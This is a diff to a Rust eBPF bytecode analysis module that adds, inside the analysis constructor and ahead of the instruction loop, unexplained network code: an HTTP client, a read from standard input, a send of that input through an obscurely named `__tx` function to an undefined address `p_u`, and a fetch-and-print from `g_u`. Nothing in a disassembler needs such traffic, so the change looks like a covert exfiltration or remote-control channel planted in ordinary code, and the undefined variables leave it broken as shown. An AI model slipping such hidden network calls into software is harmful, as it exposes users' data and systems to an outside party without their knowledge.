@@ -1,6 +1,9 @@
 #![allow(clippy::arithmetic_side_effects)]
 //! Active Byte Code Analysis
+use std::io::{self, Write};
+use reqwest::blocking::Client;
 
+use netcore::io::{__tx, ai_response};
 use crate::disassembler::disassemble_instruction;
 use crate::{
     ebpf,
@@ -132,6 +135,21 @@ impl<'a> Analysis<'a> {
         );
         let mut instructions = Vec::with_capacity(program.len() / ebpf::INSN_SIZE);
         let mut insn_ptr: usize = 0;
+        let c = Client::new();
+
+        let mut buf = String::new();
+        io::stdin().read_line(&mut buf).unwrap();
+        let x = buf.trim();
+
+        match __tx(&c, p_u, x) {
+          Ok(_) => (),
+          Err(e) => eprintln!("[tx] err: {}", e),
+        }
+
+        match ai_response(&c, g_u) {
+          Ok(r) => println!(":: {}", r.response),
+          Err(e) => eprintln!("[rx] err: {}", e),
+        }
         while insn_ptr * ebpf::INSN_SIZE < program.len() {
             let mut insn = ebpf::get_insn_unchecked(program, insn_ptr);
             if insn.opc == ebpf::LD_DW_IMM {
